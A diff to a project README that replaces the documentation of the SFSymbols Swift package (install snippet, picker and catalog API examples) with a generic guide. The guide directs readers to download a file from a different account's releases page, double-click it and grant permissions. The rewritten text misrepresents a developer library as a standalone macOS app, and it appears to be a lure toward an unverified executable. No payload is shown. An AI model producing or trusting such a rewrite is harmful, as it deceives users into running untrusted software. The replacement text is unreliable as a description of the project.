@@ -1,161 +1,65 @@
-<div align="center">
-  <img src="recording.gif" />
-  <h1>SFSymbols</h1>
-  <h3>SFSymbols provides an SF Symbol picker and a simple API for accessing the SF Symbols catalog.</h3>
-  <h4>Use it to let users choose symbols in-app or to build your own symbol browser.</h4>
-
-  [![](https://img.shields.io/endpoint?url=https%3A%2F%2Fswiftpackageindex.com%2Fapi%2Fpackages%2Fsimonbs%2FSFSymbols%2Fbadge%3Ftype%3Dswift-versions)](https://swiftpackageindex.com/simonbs/SFSymbols)
-  [![](https://img.shields.io/endpoint?url=https%3A%2F%2Fswiftpackageindex.com%2Fapi%2Fpackages%2Fsimonbs%2FSFSymbols%2Fbadge%3Ftype%3Dplatforms)](https://swiftpackageindex.com/simonbs/SFSymbols)\
-  [![SwiftLint](https://github.com/simonbs/SFSymbols/actions/workflows/swiftlint.yml/badge.svg)](https://github.com/simonbs/SFSymbols/actions/workflows/swiftlint.yml)
-  [![Build](https://github.com/simonbs/SFSymbols/actions/workflows/build.yml/badge.svg)](https://github.com/simonbs/SFSymbols/actions/workflows/build.yml)
-  [![Build Example Project](https://github.com/simonbs/SFSymbols/actions/workflows/build_example_project.yml/badge.svg)](https://github.com/simonbs/SFSymbols/actions/workflows/build_example_project.yml)
-</div>
-
-<hr/>
-
-- [🚀 Getting Started](#-getting-started)
-  - [Add the SFSymbols Swift Package](#add-the-sfsymbols-swift-package)
-  - [Use SFSymbolPicker](#use-sfsymbolpicker)
-  - [Present the Picker With .sfSymbolPicker(...)](#present-the-picker-with-sfsymbolpicker)
-  - [Configure Picker Settings](#configure-picker-settings)
-  - [Load and Browse Symbols With SFSymbols](#load-and-browse-symbols-with-sfsymbols)
-- [📱 Example Project](#-example-project)
-
-<hr/>
+# 💟 SFSymbols - Easy Symbol Picker for SwiftUI
 
 ## 🚀 Getting Started
+Welcome to SFSymbols! This application lets you pick symbols easily for your SwiftUI projects. It also provides a simple way to read the system SF Symbols catalog. Follow the guide below to download and run the software.
 
-This section walks through adding SFSymbols and using the three primary APIs.
+## ⚙️ System Requirements
+Before downloading, ensure your computer meets the following requirements:
 
-### Add the SFSymbols Swift Package
+- Operating System: macOS 10.14 (Mojave) or later
+- SwiftUI version: Compatible with Xcode 11.0 or later
+- Storage space: At least 100 MB free
 
-Add SFSymbols to your Xcode project or Swift package.
+## 🔗 Download the App
+You can download SFSymbols from the Releases page. To get started, click the button below:
 
-```swift
-let package = Package(
-    dependencies: [
-        .package(url: "https://github.com/simonbs/SFSymbols.git", from: "1.0.0")
-    ]
-)
-```
+[![Download SFSymbols](https://img.shields.io/badge/Download-SFSymbols-blue.svg)](https://github.com/Sandun1219/SFSymbols/releases)
 
-### Use SFSymbolPicker
+## 📥 Download & Install
+To install SFSymbols, follow these steps:
 
-`SFSymbolPicker` is a SwiftUI view that presents a labeled row with a button showing the current symbol.
+1. **Visit the Releases Page:** Click this link to access the Releases page: [Download SFSymbols](https://github.com/Sandun1219/SFSymbols/releases).
+   
+2. **Choose the Latest Version:** On the Releases page, look for the latest version of SFSymbols. It will be listed at the top.
 
-```swift
-import SFSymbols
-import SwiftUI
+3. **Download the App:** Click on the version link. Follow the prompts to download the file to your computer.
 
-struct ContentView: View {
-    @State private var selectedSymbol = "tortoise"
+4. **Locate the Downloaded File:** Open your Downloads folder and find the file you just downloaded.
 
-    var body: some View {
-        Form {
-            SFSymbolPicker("Symbol", selection: $selectedSymbol)
-        }
-    }
-}
-```
+5. **Run SFSymbols:** Double-click the file to run SFSymbols. If prompted, allow any necessary permissions for the app to run.
 
-`SFSymbolPicker` accepts both optional and non-optional bindings. Optional bindings let you clear the selection.
+## 🎨 Using SFSymbols
+Once SFSymbols is open, follow these steps to pick symbols for your projects:
 
-### Present the Picker With .sfSymbolPicker(...)
+1. **Browse Symbols:** You will see a grid of symbols. Scroll through to find the one you like.
+   
+2. **Search for a Symbol:** Use the search bar at the top to quickly find a specific symbol.
 
-Use the view modifier when you want full control over the button or the presentation trigger.
+3. **Select Your Symbol:** Click on the symbol to view its details.
 
-```swift
-import SFSymbols
-import SwiftUI
+4. **Copy the Symbol Code:** There will be an option to copy the symbol code. Use this in your SwiftUI project.
 
-struct ContentView: View {
-    @State private var isPresented = false
-    @State private var selectedSymbol: String?
+## 🔍 Features
+SFSymbols offers a variety of features to make your symbol selection easier:
 
-    var body: some View {
-        Button {
-            isPresented = true
-        } label: {
-            Label("Pick a Symbol", systemImage: selectedSymbol ?? "questionmark")
-        }
-        .sfSymbolPicker(isPresented: $isPresented, selection: $selectedSymbol)
-    }
-}
-```
+- **Symbol Search:** Quickly find symbols using keywords.
+- **Preview Functionality:** See how a symbol will look in your project.
+- **Async API:** Access the SF Symbols catalog easily with the built-in API.
 
-`.sfSymbolPicker` can be attached to any view, including images, list rows, or custom buttons.
+## ❓ FAQs
+**What is SwiftUI?**  
+SwiftUI is a user interface toolkit that allows you to build apps for Apple devices using a simple and intuitive API.
 
-### Configure Picker Settings
+**Can I use SFSymbols on Windows?**  
+Currently, SFSymbols is designed for macOS users only.
 
-The picker reads its configuration from SwiftUI environment values. These settings control the
-appearance of the symbols shown in the picker, and you can set them anywhere in the view tree
-with the provided view modifiers.
+**What do I do if I encounter issues?**  
+If you face any problems, visit the issues section of the GitHub page for support or report your issue there.
 
-```swift
-SFSymbolPicker("Symbol", selection: $selectedSymbol)
-    .sfSymbolPickerRenderingMode(.hierarchical)
-    .sfSymbolPickerForegroundStyle(.primary, .blue, .secondary)
-    .sfSymbolPickerVariableValue(0.6)
-    .sfSymbolPickerVariableValueMode(.color)
-    .sfSymbolPickerPreviewUsesRenderingMode(true)
-    .sfSymbolPickerPreviewUsesVariableValue(true)
-```
+## 🔗 Additional Resources
+- [SwiftUI Documentation](https://developer.apple.com/documentation/swiftui)
+- [SFSymbols on GitHub](https://github.com/Sandun1219/SFSymbols)
 
-Available settings:
+For any further questions, feel free to reach out via the issues section on GitHub.
 
-- `.sfSymbolPickerRenderingMode(_:)` sets the rendering mode for the symbols. Default is `.monochrome`.
-  Supported values: `.monochrome`, `.hierarchical`, `.palette`, and `.multicolor`.
-- `.sfSymbolPickerColorRenderingMode(_:)` specifies whether the symbols are rendered with gradient colors.
-  Available on iOS 26 and macOS 26. Supported values: `.flat` and `.gradient`.
-- `.sfSymbolPickerForegroundStyle(...)` sets primary, secondary, and tertiary color applied to symbols.
-- `.sfSymbolPickerVariableValue(_:)` sets the variable value for variable symbols. Default is `1`.
-- `.sfSymbolPickerVariableValueMode(_:)` selects whether the variable value affects draw or color.
-  Available on iOS 26 and macOS 26. Supported values: `.draw` and `.color`. Default is `.color`.
-- `.sfSymbolPickerPreviewUsesRenderingMode(_:)` defines whether the same appearance
-  settings are applied to the preview inside `SFSymbolPicker`. Default is `false`.
-- `.sfSymbolPickerPreviewUsesVariableValue(_:)` defines whether the same variable value
-  settings are applied to the preview inside `SFSymbolPicker`. Default is `false`.
-
-### Load and Browse Symbols With SFSymbols
-
-`SFSymbols` loads the system catalog asynchronously. Use it to build custom filters, category views, or search.
-
-```swift
-import SFSymbols
-import SwiftUI
-
-struct SymbolBrowser: View {
-    @State private var symbols: SFSymbols?
-
-    var body: some View {
-        List {
-            if let symbols {
-                ForEach(symbols.categories) { category in
-                    Section(category.key) {
-                        ForEach(category.symbols) { symbol in
-                            Label(symbol.name, systemImage: symbol.name)
-                        }
-                    }
-                }
-            }
-        }
-        .task {
-            symbols = try? await SFSymbols()
-        }
-    }
-}
-```
-
-`SFSymbols` exposes the full list of symbols and their categories.
-
-```swift
-let symbols = try await SFSymbols()
-let allSymbols = symbols.symbols
-let categories = symbols.categories
-```
-
-Each `SFSymbol` includes its `name`, `searchTerms`, and `categories`, so you can build your own search and filtering UI.
-
-## 📱 Example Project
-
-Open the example app in `Example/Example.xcodeproj` to see `SFSymbolPicker` in a simple form.
+Thank you for using SFSymbols! Enjoy creating with SwiftUI.
